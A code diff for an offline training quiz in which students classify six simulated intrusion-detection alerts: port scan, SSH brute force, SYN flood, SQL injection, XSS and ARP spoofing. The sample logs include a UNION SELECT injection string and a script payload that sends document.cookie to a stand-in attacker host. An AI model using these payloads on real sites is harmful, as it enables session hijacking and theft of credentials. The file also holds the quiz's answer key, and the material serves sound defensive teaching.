+  NIDS/HIDS Alert Analysis Simulator &middot; Guided training sandbox &middot; No real network traffic is generated or transmitted.
+</footer>
+
+<script>
+(function(){
+  "use strict";
+
+  // ---------- Shared answer categories (identical set/order of concepts every scenario) ----------
+  var CATEGORIES = [
+    { key:"recon",    label:"Reconnaissance / Port Scanning" },
+    { key:"brute",    label:"Brute-Force / Credential Attack" },
+    { key:"dos",      label:"Denial-of-Service (DoS/DDoS) Flood" },
+    { key:"sqli",     label:"SQL Injection" },
+    { key:"xss",      label:"Cross-Site Scripting (XSS)" },
+    { key:"arp",      label:"ARP Spoofing / On-Path (MITM) Attack" }
+  ];
+
+  // ---------- Scenario data ----------
+  var SCENARIOS = [
+    {
+      key:"recon",
+      severity:"medium",
+      severityLabel:"Medium",
+      location:"wired",
+      locationLabel:"DMZ · Wired",
+      sensor:"Sensor: Suricata NIDS · Perimeter firewall span port",
+      title:"Alert 1 of 6 &mdash; Perimeter Sensor Notice",
+      context:"A Suricata sensor monitors traffic entering the DMZ from the public Internet toward the organization's public-facing web server (10.10.20.15).",
+      log:
+"[**] [1:1000231:3] SCAN Nmap TCP Stealth Scan Detected [**]\n"+
+"[Classification: Attempted-Recon]  [Priority: 2]\n"+
+"08/21-09:14:02.334013  203.0.113.55:51322 -> 10.10.20.15:21   TCP TTL:47 ******S*\n"+
+"08/21-09:14:02.401207  203.0.113.55:51323 -> 10.10.20.15:22   TCP TTL:47 ******S*\n"+
+"08/21-09:14:02.468114  203.0.113.55:51324 -> 10.10.20.15:23   TCP TTL:47 ******S*\n"+
+"08/21-09:14:02.535880  203.0.113.55:51325 -> 10.10.20.15:25   TCP TTL:47 ******S*\n"+
+"08/21-09:14:02.601732  203.0.113.55:51326 -> 10.10.20.15:80   TCP TTL:47 ******S*\n"+
+"08/21-09:14:02.669410  203.0.113.55:51327 -> 10.10.20.15:443  TCP TTL:47 ******S*\n"+
+"08/21-09:14:02.737902  203.0.113.55:51328 -> 10.10.20.15:3389 TCP TTL:47 ******S*\n"+
+"-- 1,024 ports probed from single source in 4.9 seconds; 0 completed handshakes --",
+      hints:[
+        "Look at the destination port column across all the log lines &mdash; is the same port being hit repeatedly, or are many different ports being tried in sequence?",
+        "Notice the TCP flag field shows only S (SYN) on every line, with no matching completed handshake to any port. What activity uses rapid, sequential SYN-only probes to find open services?"
+      ],
+      explanation:"This is <strong>reconnaissance via port scanning</strong> (MITRE ATT&amp;CK T1046 &ndash; Network Service Discovery). The IOCs: a single source IP sends SYN-only packets to a long sequential list of destination ports in under five seconds, and no three-way handshake ever completes &mdash; the goal is to map open services, not to communicate or overwhelm the host. This differs from a SYN flood (Alert 3), which targets one port with enormous volume rather than many ports at low volume."
+    },
+    {
+      key:"brute",
+      severity:"high",
+      severityLabel:"High",
+      location:"wired",
+      locationLabel:"Internal Server · Wired",
+      sensor:"Sensor: Wazuh/OSSEC HIDS · Host: fileserver01 (/var/log/auth.log)",
+      title:"Alert 2 of 6 &mdash; Host-Based Authentication Log",
+      context:"A host-based agent on the internal file server (fileserver01) forwards authentication events to the HIDS manager. The excerpt below is a small sample of a much longer burst.",
+      log:
+"Aug 21 10:02:11 fileserver01 sshd[3344]: Failed password for invalid user admin from 198.51.100.77 port 42011 ssh2\n"+
+"Aug 21 10:02:12 fileserver01 sshd[3346]: Failed password for root from 198.51.100.77 port 42015 ssh2\n"+
+"Aug 21 10:02:13 fileserver01 sshd[3348]: Failed password for invalid user test from 198.51.100.77 port 42019 ssh2\n"+
+"Aug 21 10:02:13 fileserver01 sshd[3350]: Failed password for invalid user oracle from 198.51.100.77 port 42022 ssh2\n"+
+"Aug 21 10:02:14 fileserver01 sshd[3352]: Failed password for invalid user admin from 198.51.100.77 port 42027 ssh2\n"+
+"... [47 additional failures from 198.51.100.77 in the following 90 seconds, 0 successes] ...\n"+
+"HIDS Rule 5712 fired: \"SSHD brute force trying to get access to the system.\"",
+      hints:[
+        "Which layer generated this log &mdash; raw network packets, or an application/service (sshd authentication)?",
+        "Count how many different usernames are being tried from the very same source address in under two minutes. What is that pattern typically called?"
+      ],
+      explanation:"This is a <strong>brute-force / credential attack</strong> (MITRE ATT&amp;CK T1110 &ndash; Brute Force). The IOCs: dozens of failed authentication attempts against many different usernames, all from one source IP, in a very short window &mdash; generated at the application layer (sshd), not the network layer. This is why it's picked up by a HIDS log rule rather than a packet-inspection signature."
+    },
+    {
+      key:"dos",
+      severity:"critical",
+      severityLabel:"Critical",
+      location:"wired",
+      locationLabel:"Datacenter · Wired",
+      sensor:"Sensor: Suricata NIDS · Edge link in front of web cluster",
+      title:"Alert 3 of 6 &mdash; Network Edge Volumetric Alert",
+      context:"The e-commerce web cluster (10.10.5.20) begins failing health checks. The NIDS at the network edge raises a priority-1 alert seconds later.",
+      log:
+"[**] [1:1002911:9] DOS SYN Flood Threshold Exceeded [**]\n"+
+"[Classification: Denial-of-Service]  [Priority: 1]\n"+
+"08/21-14:41:09.881  Target: 10.10.5.20:443\n"+
+"Unique source IPs observed:      40,812\n"+
+"SYN packets/sec (5s avg):        58,340\n"+
+"Completed 3-way handshakes:      12\n"+
+"Server CPU:                      98%   |  Service response: degraded/timeout",
+      hints:[
+        "Compare the number of distinct source IPs and destination ports here to Alert 1's port scan. What's different about the scale and the target?",
+        "58,340 SYN packets/sec against only 12 completed handshakes &mdash; what does that huge imbalance suggest the attacker's goal is: mapping services, or exhausting resources?"
+      ],
+      explanation:"This is a <strong>Denial-of-Service / Distributed Denial-of-Service SYN flood</strong> (MITRE ATT&amp;CK T1498/T1499 &ndash; Network/Endpoint Denial of Service). The IOCs: an overwhelming volume of SYN packets aimed at a single port from tens of thousands of sources, with almost none of the handshakes completing, and measurable resource exhaustion (CPU, degraded service). The goal is availability disruption, not enumeration or data theft."
+    },
+    {
+      key:"sqli",
+      severity:"high",
+      severityLabel:"High",
+      location:"wired",
+      locationLabel:"Web Application · Wired",
+      sensor:"Sensor: Suricata NIDS with HTTP protocol decoding",
+      title:"Alert 4 of 6 &mdash; Web Application Traffic Alert",
+      context:"The campus bookstore web application (shop.internal.mvcc.edu, 10.10.20.15) receives an unusual request to a product lookup page.",
+      log:
+"[Suricata HTTP] ALERT [1:1000063:5] WEB-ATTACKS SQL Injection Attempt (UNION SELECT)\n"+
+"08/21-16:22:47  Src: 172.16.4.201:53112 -> Dst: 10.10.20.15:80\n"+
+"GET /products.php?id=15 UNION SELECT username,password,3,4 FROM users-- - HTTP/1.1\n"+
+"Host: shop.internal.mvcc.edu\n"+
+"User-Agent: sqlmap/1.7#stable",
+      hints:[
+        "Look closely at the URL/query string &mdash; what unusual SQL keywords appear where a simple numeric product ID would normally be?",
+        "Check the User-Agent header. Does it look like an ordinary web browser, or a known security/penetration-testing tool?"
+      ],
+      explanation:"This is a <strong>SQL Injection</strong> attempt (MITRE ATT&amp;CK T1190 &ndash; Exploit Public-Facing Application). The IOCs: SQL syntax (UNION SELECT) injected into the <code>id</code> parameter attempting to pull <code>username,password</code> from a <code>users</code> table, a SQL comment terminator (<code>-- -</code>) used to nullify the rest of the query, and a User-Agent string identifying the well-known automated tool <em>sqlmap</em>."
+    },
+    {
+      key:"xss",
+      severity:"high",
+      severityLabel:"High",
+      location:"wired",
+      locationLabel:"Web Application · Wired",
+      sensor:"Sensor: Suricata NIDS with HTTP protocol decoding (TLS-terminated copy)",
+      title:"Alert 5 of 6 &mdash; Web Application Traffic Alert",
+      context:"A request arrives at the student portal's search feature (portal.mvcc.edu, 10.10.20.30). The query string below has been URL-decoded for readability under the raw request.",
+      log:
+"[Suricata HTTP] ALERT [1:1000097:4] WEB-ATTACKS Cross-site Scripting Attempt (Script Tag)\n"+
+"08/21-09:05:33  Src: 203.0.113.212:44870 -> Dst: 10.10.20.30:443 (TLS)\n"+
+"GET /search.aspx?q=%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fevil-collect.example%2Fc%3Fc%3D%27%2Bdocument.cookie%3C%2Fscript%3E HTTP/1.1\n"+
+"Host: portal.mvcc.edu\n"+
+"\n"+
+"Decoded q parameter:\n"+
+"<script>document.location='http://evil-collect.example/c?c='+document.cookie<\/script>",
+      hints:[
+        "Decode the URL-encoded characters (%3C = &lt;, %3E = &gt;). What HTML/JavaScript element is being injected into the search field?",
+        "What is the injected script trying to grab from the victim's browser session, and where is it being sent?"
+      ],
+      explanation:"This is <strong>Cross-Site Scripting (XSS)</strong> (related to MITRE ATT&amp;CK T1189 and CWE-79). The IOCs: a <code>&lt;script&gt;</code> tag injected directly into the <code>q</code> search parameter, which redirects the victim's browser to an external attacker-controlled domain (<em>evil-collect.example</em>) while appending <code>document.cookie</code> &mdash; a classic reflected-XSS session/cookie theft attempt, distinct from SQL Injection because the payload targets the browser's script engine, not the backend database."
+    },
+    {
+      key:"arp",
+      severity:"critical",
+      severityLabel:"Critical",
+      location:"wireless",
+      locationLabel:"Faculty/Guest VLAN · Wireless",
+      sensor:"Sensor: arpwatch anomaly monitor on core switch (VLAN 30)",
+      title:"Alert 6 of 6 &mdash; Layer 2 Anomaly Report",
+      context:"VLAN 30 serves the wireless faculty/guest network. The default gateway for that VLAN is 10.10.30.1. The switch's ARP anomaly monitor begins logging rapid changes for that address.",
+      log:
+"[arpwatch] flip flop  10.10.30.1  00:1A:2B:3C:4D:5E  (was AA:BB:CC:11:22:33)\n"+
+"[arpwatch] flip flop  10.10.30.1  AA:BB:CC:11:22:33  (was 00:1A:2B:3C:4D:5E)\n"+
+"[arpwatch] flip flop  10.10.30.1  00:1A:2B:3C:4D:5E  (was AA:BB:CC:11:22:33)\n"+
+"[arpwatch] flip flop  10.10.30.1  AA:BB:CC:11:22:33  (was 00:1A:2B:3C:4D:5E)\n"+
+"Note: gratuitous ARP replies for the gateway IP alternate between two different MAC\n"+
+"addresses roughly every 2 seconds. Both MACs are associated with wireless clients on VLAN 30.",
+      hints:[
+        "This alert concerns Layer 2 (MAC addresses), not ports or payloads. What single IP address keeps flip-flopping between two different hardware addresses?",
+        "An attacker on the same local wired or wireless segment can send forged replies claiming to BE the default gateway, so traffic routes through the attacker first. What is that Layer-2 impersonation technique called?"
+      ],
+      explanation:"This is <strong>ARP Spoofing / an On-Path (Man-in-the-Middle) attack</strong> (MITRE ATT&amp;CK T1557.002 &ndash; ARP Cache Poisoning). The IOCs: the default gateway's IP address is repeatedly bound to two different MAC addresses in rapid succession ('flip flop'), a hallmark of gratuitous/forged ARP replies used to hijack Layer&nbsp;2 traffic on a local wired or wireless segment so the attacker can intercept or manipulate communications between clients and the real gateway."
+    }
+  ];
+
+  var MAX_PER_SCENARIO = 10;
+  var HINT_PENALTY = 2;
+  var WRONG_PENALTY = 3;
+  var MAX_ATTEMPTS_BEFORE_REVEAL = 2;
+
+  // ---------- State ----------
+  var state = {
+    idx:0,
+    results:[],           // per scenario: {key,label,correct,attempts,hintsUsed,points,revealed}
+    hintsUsedThis:0,
+    attemptsThis:0,
+    optionOrder:[],
+    selectedKey:null,
+    locked:false,
+    finished:false
+  };
+
+  // ---------- Helpers ----------
+  function $(id){ return document.getElementById(id); }
+  function shuffled(arr){
+    var a = arr.slice();
+    for(var i=a.length-1;i>0;i--){
+      var j = Math.floor(Math.random()*(i+1));
+      var t=a[i]; a[i]=a[j]; a[j]=t;
+    }
+    return a;
+  }
+  function catLabel(key){
+    for(var i=0;i<CATEGORIES.length;i++){ if(CATEGORIES[i].key===key) return CATEGORIES[i].label; }
+    return key;
+  }
+  function escapeHtml(s){
+    return s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
+  }
+
+  function showScreen(id){
+    var screens = document.querySelectorAll(".screen");
+    for(var i=0;i<screens.length;i++){ screens[i].classList.remove("active"); }
+    $(id).classList.add("active");
+  }
+
+  function updateHeader(){
+    var total = SCENARIOS.length;
+    if(state.finished){
+      $("progressPill").textContent = "Summary";
+      $("progressFill").style.width = "100%";
+    } else if($("screen-scenario").classList.contains("active")){
+      $("progressPill").textContent = "Alert " + (state.idx+1) + " of " + total;
+      $("progressFill").style.width = Math.round(((state.idx)/total)*100) + "%";
+    } else {
+      $("progressPill").textContent = "Briefing";
+      $("progressFill").style.width = "0%";
+    }
+    var earned = 0;
+    for(var i=0;i<state.results.length;i++){ earned += state.results[i].points; }
+    $("scorePill").textContent = "Score: " + earned + " / " + (total*MAX_PER_SCENARIO);
+  }
+
+  // ---------- Scenario rendering ----------
+  function loadScenario(i){
+    var sc = SCENARIOS[i];
+    state.hintsUsedThis = 0;
+    state.attemptsThis = 0;
+    state.selectedKey = null;
+    state.locked = false;
+
+    $("scSeverity").textContent = sc.severityLabel + " severity";
+    $("scSeverity").className = "badge " + sc.severity;
+    $("scLocation").textContent = sc.locationLabel;
+    $("scLocation").className = "badge " + sc.location;
+    $("scSensor").textContent = sc.sensor;
+    $("scTitle").innerHTML = sc.title;
+    $("scContext").textContent = sc.context;
+    $("scLog").textContent = sc.log;
+
+    state.optionOrder = shuffled(CATEGORIES);
+    var optWrap = $("scOptions");
+    optWrap.innerHTML = "";
+    state.optionOrder.forEach(function(cat){
+      var btn = document.createElement("button");
+      btn.type = "button";
+      btn.className = "option";
+      btn.setAttribute("role","radio");
+      btn.setAttribute("aria-checked","false");
+      btn.dataset.key = cat.key;
+      btn.innerHTML = '<span class="radio-dot" aria-hidden="true"></span><span>' + escapeHtml(cat.label) + '</span>';
+      btn.addEventListener("click", function(){ selectOption(this); });
+      optWrap.appendChild(btn);
+    });
+
+    var fb = $("scFeedback");
+    fb.className = "feedback";
+    fb.innerHTML = "";
+    $("scHints").innerHTML = "";
+    $("hintBtn").disabled = false;
+    $("hintBtn").style.display = "";
+    $("submitBtn").style.display = "";
+    $("submitBtn").disabled = true;
+    $("nextBtn").style.display = "none";
+
+    showScreen("screen-scenario");
+    updateHeader();
+  }
+
+  function selectOption(btn){
+    if(state.locked) return;
+    var all = $("scOptions").querySelectorAll(".option");
+    for(var i=0;i<all.length;i++){
+      all[i].classList.remove("selected");
+      all[i].setAttribute("aria-checked","false");
+    }
+    btn.classList.add("selected");
+    btn.setAttribute("aria-checked","true");
+    state.selectedKey = btn.dataset.key;
+    $("submitBtn").disabled = false;
+  }
+
+  function useHint(){
+    var sc = SCENARIOS[state.idx];
+    if(state.hintsUsedThis >= sc.hints.length || state.locked) return;
+    var box = document.createElement("div");
+    box.className = "hint-box show";
+    box.innerHTML = "<strong>Hint " + (state.hintsUsedThis+1) + ":</strong> " + escapeHtml(sc.hints[state.hintsUsedThis]);
+    $("scHints").appendChild(box);
+    state.hintsUsedThis++;
+    if(state.hintsUsedThis >= sc.hints.length){
+      $("hintBtn").disabled = true;
+      $("hintBtn").textContent = "No more hints";
+    } else {
+      $("hintBtn").textContent = "Get Another Hint";
+    }
+  }
+
+  function submitAnswer(){
+    if(state.locked || !state.selectedKey) return;
+    var sc = SCENARIOS[state.idx];
+    var correct = state.selectedKey === sc.key;
+    var all = $("scOptions").querySelectorAll(".option");
+    var fb = $("scFeedback");
+
+    if(correct){
+      for(var i=0;i<all.length;i++){
+        all[i].disabled = true;
+        if(all[i].dataset.key === sc.key) all[i].classList.add("correct");
+      }
+      var pts = Math.max(0, MAX_PER_SCENARIO - (state.hintsUsedThis*HINT_PENALTY) - (state.attemptsThis*WRONG_PENALTY));
+      state.results.push({key:sc.key,label:catLabel(sc.key),correct:true,attempts:state.attemptsThis+1,hintsUsed:state.hintsUsedThis,points:pts,revealed:false});
+      fb.className = "feedback show correct";
+      fb.innerHTML = "<p><strong>&#10003; Correct &mdash; " + catLabel(sc.key) + ".</strong></p><p>" + sc.explanation + "</p><p class='small'>Points earned: " + pts + " / " + MAX_PER_SCENARIO + "</p>";
+      finishScenarioTurn();
+    } else {
+      state.attemptsThis++;
+      for(var j=0;j<all.length;j++){
+        if(all[j].dataset.key === state.selectedKey) all[j].classList.add("incorrect");
+      }
+      if(state.attemptsThis >= MAX_ATTEMPTS_BEFORE_REVEAL){
+        for(var k=0;k<all.length;k++){
+          all[k].disabled = true;
+          if(all[k].dataset.key === sc.key) all[k].classList.add("correct");
         }
+        state.results.push({key:sc.key,label:catLabel(sc.key),correct:false,attempts:state.attemptsThis,hintsUsed:state.hintsUsedThis,points:0,revealed:true});
+        fb.className = "feedback show reveal";
+        fb.innerHTML = "<p><strong>Correct answer revealed: " + catLabel(sc.key) + ".</strong></p><p>" + sc.explanation + "</p><p class='small'>0 points awarded for this alert &mdash; review the explanation, then continue.</p>";
+        finishScenarioTurn();
+      } else {
+        fb.className = "feedback show incorrect";
+        fb.innerHTML = "<p><strong>&#10007; Not quite.</strong> That's not the best match for these indicators. Take another look at the log " +
+          "(source/destination, ports, flags, payload, and volume) and try again, or use a hint.</p>";
+        // allow retry: re-enable selection, clear selection highlight (but keep incorrect mark visible briefly is fine)
+        state.selectedKey = null;
+        $("submitBtn").disabled = true;
+        for(var m=0;m<all.length;m++){ all[m].classList.remove("selected"); all[m].setAttribute("aria-checked","false"); }
+      }
+    }
+    updateHeader();
+  }
 
-        function startMonitoring() {
-            if (!ipsOnline || monitoringActive) return;
-            
-            monitoringActive = true;
-            addLog('[IPS] Starting network traffic monitoring...', 'info');
-            addLog('[IPS] Monitoring all ingress and egress traffic', 'info');
-            
-            updateIPSStatus('Online - Monitoring');
-            document.getElementById('startMonitoringBtn').disabled = true;
-            document.getElementById('trafficControls').style.display = 'block';
-            document.getElementById('signatureControls').style.display = 'block';
-            
-            // Start passive monitoring animation
-            startTrafficAnimation();
-        }
+  function finishScenarioTurn(){
+    state.locked = true;
+    $("hintBtn").style.display = "none";
+    $("submitBtn").style.display = "none";
+    $("nextBtn").style.display = "";
+    $("nextBtn").focus();
+  }
 
-        function shutdownIPS() {
-            if (!ipsOnline) return;
-            
-            ipsOnline = false;
-            monitoringActive = false;
-            addLog('[SYSTEM] Shutting down IPS system...', 'warning');
-            
-            setTimeout(() => {
-                addLog('[SYSTEM] IPS system offline', 'warning');
-                updateIPSStatus('Offline');
-                document.getElementById('ipsNode').innerHTML = 'IPS<br>OFFLINE';
-                document.getElementById('ipsNode').style.backgroundColor = '#f44336';
-                document.getElementById('statusIndicator').className = 'status-indicator status-blocked';
-                
-                // Reset buttons
-                document.getElementById('initializeBtn').disabled = false;
-                document.getElementById('startMonitoringBtn').disabled = true;
-                document.getElementById('shutdownBtn').disabled = true;
-                document.getElementById('detectionMethods').style.display = 'none';
-                document.getElementById('trafficControls').style.display = 'none';
-                document.getElementById('signatureControls').style.display = 'none';
-                
-                stopTrafficAnimation();
-            }, 1500);
-        }
+  function nextScenario(){
+    if(state.idx < SCENARIOS.length - 1){
+      state.idx++;
+      loadScenario(state.idx);
+    } else {
+      state.finished = true;
+      renderSummary();
+      showScreen("screen-summary");
+      updateHeader();
+    }
+  }
 
-        function updateDetectionMethod() {
-            const newMethod = document.getElementById('detectionMode').value;
-            detectionMethod = newMethod;
-            
-            addLog(`[CONFIG] Detection method changed to: ${newMethod.toUpperCase()}`, 'info');
-            
-            switch(newMethod) {
-                case 'signature':
-                    addLog('[CONFIG] Using signature-based detection for known threats', 'info');
-                    break;
-                case 'anomaly':
-                    addLog('[CONFIG] Using anomaly-based detection for behavioral analysis', 'info');
-                    break;
-                case 'hybrid':
-                    addLog('[CONFIG] Using hybrid detection for comprehensive protection', 'info');
-                    break;
-            }
-            
-            completeTask(2);
-        }
+  // ---------- Summary ----------
+  function gradeFor(pct){
+    if(pct>=90) return "A";
+    if(pct>=80) return "B";
+    if(pct>=70) return "C";
+    if(pct>=60) return "D";
+    return "F";
+  }
 
-        function addSignature() {
-            const signatureType = document.getElementById('signatureSelect').value;
-            const signatureMap = {
-                'sql_injection': 'SQL Injection Pattern (SELECT * FROM)',
-                'xss_attack': 'XSS Attack Pattern (<script>)',
-                'port_scan': 'Port Scan Pattern (Sequential port access)',
-                'dos_attack': 'DoS Attack Pattern (High request frequency)'
-            };
-            
-            if (!signatures.includes(signatureType)) {
-                signatures.push(signatureType);
-                addLog(`[SIGNATURES] Added signature: ${signatureMap[signatureType]}`, 'success');
-                updateSignatureDisplay();
-                
-                if (signatures.length >= 3) {
-                    completeTask(3);
-                }
-            } else {
-                addLog(`[SIGNATURES] Signature already exists: ${signatureMap[signatureType]}`, 'warning');
-            }
-        }
+  function renderSummary(){
+    var total = SCENARIOS.length * MAX_PER_SCENARIO;
+    var earned = 0;
+    state.results.forEach(function(r){ earned += r.points; });
+    var pct = Math.round((earned/total)*100);
+    var grade = gradeFor(pct);
 
-        function removeSignature() {
-            const signatureType = document.getElementById('signatureSelect').value;
-            const index = signatures.indexOf(signatureType);
-            
-            if (index > -1) {
-                signatures.splice(index, 1);
-                addLog(`[SIGNATURES] Removed signature: ${signatureType}`, 'warning');
-                updateSignatureDisplay();
-            } else {
-                addLog(`[SIGNATURES] Signature not found: ${signatureType}`, 'warning');
-            }
-        }
+    var name = $("studentName").value.trim();
+    var dateStr = new Date().toDateString ? formattedDate() : "";
+    $("summaryMeta").textContent = (name ? name + " · " : "") + "Course: NIDS/HIDS Alert Analysis" + (dateStr ? " · " + dateStr : "");
 
-        function sendLegitimateTraffic() {
-            if (!monitoringActive) return;
-            
-            const packets = Math.floor(Math.random() * 5) + 3;
-            packetsProcessed += packets;
-            
-            addLog(`[TRAFFIC] Processing ${packets} legitimate packets`, 'info');
-            addLog(`[ANALYSIS] All packets passed security inspection`, 'success');
-            
-            updateStatistics();
-            animatePacket('legitimate');
-        }
+    $("gradeLetter").textContent = grade;
+    $("gradePct").textContent = pct + "%";
+    $("gradeHeadline").innerHTML = "<strong>" + earned + " / " + total + " points (" + pct + "%) &mdash; Grade: " + grade + "</strong>";
 
-        function sendMaliciousTraffic() {
-            if (!monitoringActive) return;
-            
-            const attackTypes = ['sql_injection', 'xss_attack', 'port_scan', 'dos_attack'];
-            const attackType = attackTypes[Math.floor(Math.random() * attackTypes.length)];
-            const detected = signatures.includes(attackType) || detectionMethod === 'hybrid';
-            
-            packetsProcessed += 1;
-            
-            if (detected) {
-                threatsBlocked += 1;
-                addLog(`[THREAT DETECTED] ${attackType.toUpperCase()} attack blocked!`, 'danger');
-                addLog(`[ACTION] Packet dropped, source IP logged`, 'success');
-                animatePacket('blocked');
-            } else {
-                addLog(`[TRAFFIC] Suspicious packet passed inspection`, 'warning');
-                addLog(`[WARNING] Potential threat not detected - update signatures!`, 'warning');
-                animatePacket('malicious');
-            }
-            
-            updateStatistics();
-            checkTask4Completion();
-        }
+    var correctCount = state.results.filter(function(r){return r.correct;}).length;
+    $("gradeSub").textContent = correctCount + " of " + SCENARIOS.length + " alerts correctly identified.";
 
-        function sendMixedTraffic() {
-            if (!monitoringActive) return;
-            
-            addLog(`[TRAFFIC] Processing mixed traffic burst...`, 'info');
-            
-            // Simulate multiple packets
-            for (let i = 0; i < 10; i++) {
-                setTimeout(() => {
-                    if (Math.random() > 0.7) {
-                        sendMaliciousTraffic();
-                    } else {
-                        // Sometimes create false positives in anomaly mode
-                        if (detectionMethod === 'anomaly' && Math.random() > 0.8) {
-                            falsePositives += 1;
-                            packetsProcessed += 1;
-                            addLog(`[FALSE POSITIVE] Legitimate traffic flagged as suspicious`, 'warning');
-                            updateStatistics();
-                        } else {
-                            sendLegitimateTraffic();
-                        }
-                    }
-                }, i * 500);
-            }
-            
-            setTimeout(() => {
-                checkTask5Completion();
-            }, 6000);
-        }
+    var body = $("resultsBody");
+    body.innerHTML = "";
+    state.results.forEach(function(r,i){
+      var tr = document.createElement("tr");
+      tr.innerHTML = "<td>" + (i+1) + "</td>" +
+        "<td>" + escapeHtml(r.label) + "</td>" +
+        "<td class='center'>" + (r.correct ? "<span class='tag-ok'>Correct</span>" : "<span class='tag-no'>Revealed</span>") + "</td>" +
+        "<td class='center'>" + r.attempts + "</td>" +
+        "<td class='center'>" + r.hintsUsed + "</td>" +
+        "<td class='center'>" + r.points + " / " + MAX_PER_SCENARIO + "</td>";
+      body.appendChild(tr);
+    });
 
-        function checkTask4Completion() {
-            if (threatsBlocked >= 5 && !tasks[3].completed) {
-                completeTask(4);
-            }
-        }
+    var strengths = state.results.filter(function(r){ return r.correct && r.hintsUsed===0 && r.attempts===1; });
+    var review = state.results.filter(function(r){ return !r.correct || r.hintsUsed>0 || r.attempts>1; });
 
-        function checkTask5Completion() {
-            const totalThreats = threatsBlocked + (packetsProcessed - threatsBlocked);
-            const accuracy = totalThreats > 0 ? (threatsBlocked / totalThreats) * 100 : 0;
-            
-            if (accuracy >= 70 && falsePositives <= 3 && !tasks[4].completed) {
-                completeTask(5);
-            }
-        }
+    $("strengthsIntro").textContent = strengths.length
+      ? "You correctly identified the following without help — solid, independent signature analysis:"
+      : "No alerts were identified independently on the first attempt without a hint this run — that's the next skill to build.";
+    var sList = $("strengthsList");
+    sList.innerHTML = "";
+    strengths.forEach(function(r){
+      var li = document.createElement("li");
+      li.textContent = r.label;
+      sList.appendChild(li);
+    });
 
-        function completeTask(taskId) {
-            if (tasks[taskId - 1].completed) return;
-            
-            tasks[taskId - 1].completed = true;
-            score += tasks[taskId - 1].points;
-            
-            addLog(`[ACHIEVEMENT] Task ${taskId} completed! (+${tasks[taskId - 1].points} points)`, 'success');
-            
-            const successDiv = document.createElement('div');
-            successDiv.className = 'success-message';
-            successDiv.innerHTML = `🎉 Task ${taskId} Complete! You earned ${tasks[taskId - 1].points} points!`;
-            
-            const taskDesc = document.getElementById('taskDescription');
-            taskDesc.parentNode.insertBefore(successDiv, taskDesc.nextSibling);
-            
-            setTimeout(() => {
-                successDiv.remove();
-            }, 3000);
-            
-            // Move to next task
-            if (taskId < tasks.length) {
-                currentTask = taskId + 1;
-                updateTaskDisplay();
-            } else {
-                // All tasks completed
-                addLog(`[CONGRATULATIONS] All tasks completed! Final score: ${score}/100`, 'success');
-                showCompletionMessage();
-            }
-            
-            updateScore();
-        }
+    $("reviewIntro").textContent = review.length
+      ? "Revisit these categories — either the answer needed a hint/second attempt, or was revealed:"
+      : "Nice work — no categories need review this run.";
+    var rList = $("reviewList");
+    rList.innerHTML = "";
+    review.forEach(function(r){
+      var li = document.createElement("li");
+      var note = !r.correct ? "review the IOCs for this category before your next attempt."
+                 : "correct, but used " + r.hintsUsed + " hint(s) and/or " + r.attempts + " attempt(s) — practice spotting this pattern faster.";
+      li.textContent = r.label + " — " + note;
+      rList.appendChild(li);
+    });
+  }
 
-        function updateTaskDisplay() {
-            const task = tasks[currentTask - 1];
-            document.getElementById('taskDescription').innerHTML = 
-                `<strong>Task ${currentTask}: ${task.title}</strong><br>${task.description}`;
-            document.getElementById('currentObjective').textContent = task.objective;
-            document.getElementById('currentTask').textContent = currentTask;
-            
-            // Update progress bar
-            const progress = ((currentTask - 1) / tasks.length) * 100;
-            document.getElementById('progressBar').style.width = progress + '%';
-        }
+  function formattedDate(){
+    var d = new Date();
+    var months = ["January","February","March","April","May","June","July","August","September","October","November","December"];
+    return months[d.getMonth()] + " " + d.getDate() + ", " + d.getFullYear();
+  }
 
-        function showCompletionMessage() {
-            const completion = document.createElement('div');
-            completion.className = 'success-message';
-            completion.style.fontSize = '1.2em';
-            completion.style.padding = '25px';
-            completion.innerHTML = `
-                🏆 <strong>SIMULATION COMPLETE!</strong> 🏆<br>
-                You've mastered IPS fundamentals!<br>
-                Final Score: ${score}/100<br>
-                <small>You're ready for advanced cybersecurity challenges!</small>
-            `;
-            
-            document.querySelector('.simulator-panel').appendChild(completion);
-        }
+  // ---------- Save summary as downloadable text file ----------
+  function saveSummary(){
+    var total = SCENARIOS.length * MAX_PER_SCENARIO;
+    var earned = 0;
+    state.results.forEach(function(r){ earned += r.points; });
+    var pct = Math.round((earned/total)*100);
+    var grade = gradeFor(pct);
+    var name = $("studentName").value.trim() || "(name not entered)";
 
-        function updateScore() {
-            document.getElementById('score').textContent = score;
-        }
+    var lines = [];
+    lines.push("NIDS/HIDS ALERT ANALYSIS SIMULATOR — SUMMARY REPORT");
+    lines.push("======================================================");
+    lines.push("Student: " + name);
+    lines.push("Date: " + formattedDate());
+    lines.push("");
+    lines.push("SCORE: " + earned + " / " + total + " (" + pct + "%)   GRADE: " + grade);
+    lines.push("Alerts correctly identified: " + state.results.filter(function(r){return r.correct;}).length + " / " + SCENARIOS.length);
+    lines.push("");
+    lines.push("ALERT-BY-ALERT RESULTS");
+    lines.push("------------------------------------------------------");
+    state.results.forEach(function(r,i){
+      lines.push((i+1) + ". " + r.label);
+      lines.push("   Result: " + (r.correct ? "Correct" : "Revealed after " + r.attempts + " attempt(s)"));
+      lines.push("   Attempts: " + r.attempts + "   Hints used: " + r.hintsUsed + "   Points: " + r.points + " / " + MAX_PER_SCENARIO);
+      lines.push("");
+    });
+    lines.push("INSTRUCTOR FEEDBACK");
+    lines.push("------------------------------------------------------");
+    var strengths = state.results.filter(function(r){ return r.correct && r.hintsUsed===0 && r.attempts===1; });
+    var review = state.results.filter(function(r){ return !r.correct || r.hintsUsed>0 || r.attempts>1; });
+    lines.push("Strengths (identified independently, no hints):");
+    if(strengths.length){ strengths.forEach(function(r){ lines.push("  - " + r.label); }); }
+    else { lines.push("  - None this run — keep practicing independent analysis."); }
+    lines.push("");
+    lines.push("Recommended review:");
+    if(review.length){
+      review.forEach(function(r){
+        var note = !r.correct ? "revisit the IOCs for this category." : "used hint(s)/extra attempt(s) — build speed and confidence.";
+        lines.push("  - " + r.label + ": " + note);
+      });
+    } else {
+      lines.push("  - None — great work across all six categories.");
+    }
+    lines.push("");
+    lines.push("======================================================");
+    lines.push("Generated by the NIDS/HIDS Alert Analysis Simulator (offline, client-side).");
 
-        function updateStatistics() {
-            document.getElementById('packetsProcessed').textContent = packetsProcessed;
-            document.getElementById('threatsBlocked').textContent = threatsBlocked;
-            document.getElementById('falsePositives').textContent = falsePositives;
-        }
